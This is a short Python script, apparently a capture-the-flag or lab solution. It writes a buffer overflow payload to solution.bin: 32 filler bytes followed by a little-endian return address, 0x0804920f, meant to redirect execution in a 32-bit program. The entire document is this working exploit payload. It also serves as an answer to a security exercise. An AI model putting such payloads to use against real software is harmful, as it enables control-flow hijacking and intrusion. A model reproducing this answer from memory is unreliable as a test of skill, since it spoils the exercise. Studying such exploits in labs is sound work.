#! /usr/bin/env python3
with open('solution.bin', 'wb') as f:
    address = 0x0804920f
    solution = b'A'*32 + address.to_bytes(4, 'little')
    f.write(solution)

